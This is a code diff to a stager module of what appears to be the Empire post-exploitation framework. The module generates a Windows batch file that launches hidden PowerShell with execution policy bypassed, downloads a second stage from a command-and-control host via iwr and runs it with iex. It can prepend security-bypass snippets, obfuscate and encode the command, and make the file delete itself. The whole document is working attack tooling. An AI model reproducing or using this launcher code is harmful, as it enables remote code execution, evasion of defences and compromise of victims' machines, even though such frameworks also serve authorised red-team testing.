@@ -1,9 +1,10 @@
 from __future__ import print_function
 
-import base64
 import logging
 from builtins import object
 
+from empire.server.common.helpers import enc_powershell
+from empire.server.core.db import models
 from empire.server.core.db.base import SessionLocal
 
 log = logging.getLogger(__name__)
@@ -64,7 +65,7 @@ class Stager(object):
             "Bypasses": {
                 "Description": "Bypasses as a space separated list to be prepended to the launcher",
                 "Required": False,
-                "Value": "mattifestation etw",
+                "Value": "",
             },
         }
 
@@ -93,49 +94,69 @@ class Stager(object):
 
         listener = self.mainMenu.listenersv2.get_by_name(SessionLocal(), listener_name)
         host = listener.options["Host"]["Value"]
-
-        if language == "powershell":
-            launcher = f"powershell.exe -nol -w 1 -nop -ep bypass \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{host}/download/powershell/"
-
-            # generate base64 of obfuscate command for first stage
-            if obfuscate:
-                launcher_obfuscate_command = f"{obfuscate_command}:"
-
-            else:
-                launcher_obfuscate_command = ":"
-
-            if bypasses:
-                launcher_bypasses = f"{bypasses}"
-            else:
-                launcher_bypasses = ""
-
-            launcher_end = base64.b64encode(
-                (launcher_obfuscate_command + launcher_bypasses).encode("UTF-8")
-            ).decode("UTF-8")
-            launcher_end += "') -UseBasicParsing|iex\""
-
-            launcher = launcher + launcher_end
-        else:
-            oneliner = self.mainMenu.stagers.generate_exe_oneliner(
-                language=language,
-                obfuscate=obfuscate,
-                obfuscation_command=obfuscate_command,
-                encode=True,
-                listener_name=listener_name,
-            )
-
-            oneliner = oneliner.split("-enc ")[1]
-            launcher = f"powershell.exe -nol -w 1 -nop -ep bypass -enc {oneliner}"
-
         if host == "":
             log.error("[!] Error in launcher command generation.")
             return ""
 
-        else:
-            code = "@echo off\n"
-            code += "start /b " + launcher + "\n"
-            if delete.lower() == "true":
-                # code that causes the .bat to delete itself
-                code += '(goto) 2>nul & del "%~f0"\n'
+        if listener.module in ["http", "http_com"]:
+            if language == "powershell":
+                launcher = "powershell.exe -nol -w 1 -nop -ep bypass "
+                launcher_ps = f"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{host}/download/powershell/')-UseBasicParsing|iex"
 
-            return code
+                if obfuscate:
+                    launcher = "powershell.exe -nol -w 1 -nop -ep bypass -enc "
+
+                    with SessionLocal.begin() as db:
+                        for bypass in bypasses.split(" "):
+                            bypass = (
+                                db.query(models.Bypass)
+                                .filter(models.Bypass.name == bypass)
+                                .first()
+                            )
+                            if bypass:
+                                if bypass.language == language:
+                                    launcher_ps = bypass.code + launcher_ps
+                                else:
+                                    log.warning(
+                                        f"Invalid bypass language: {bypass.language}"
+                                    )
+
+                    launcher_ps = self.mainMenu.obfuscationv2.obfuscate(
+                        launcher_ps, obfuscate_command
+                    )
+                    launcher_ps = enc_powershell(launcher_ps).decode("UTF-8")
+
+                launcher = launcher + launcher_ps
+            else:
+                oneliner = self.mainMenu.stagers.generate_exe_oneliner(
+                    language=language,
+                    obfuscate=obfuscate,
+                    obfuscation_command=obfuscate_command,
+                    encode=True,
+                    listener_name=listener_name,
+                )
+
+                oneliner = oneliner.split("-enc ")[1]
+                launcher = f"powershell.exe -nol -w 1 -nop -ep bypass -enc {oneliner}"
+
+        else:
+            if language == "powershell":
+                launcher = self.mainMenu.stagers.generate_launcher(
+                    listenerName=listener_name,
+                    language="powershell",
+                    encode=True,
+                    obfuscate=obfuscate,
+                    obfuscation_command=obfuscate_command,
+                )
+
+        if len(launcher) > 8192:
+            log.error("[!] Error launcher code is greater than 8192 characters.")
+            return ""
+
+        code = "@echo off\n"
+        code += "start " + launcher + "\n"
+        if delete.lower() == "true":
+            # code that causes the .bat to delete itself
+            code += '(goto) 2>nul & del "%~f0"\n'
+
+        return code
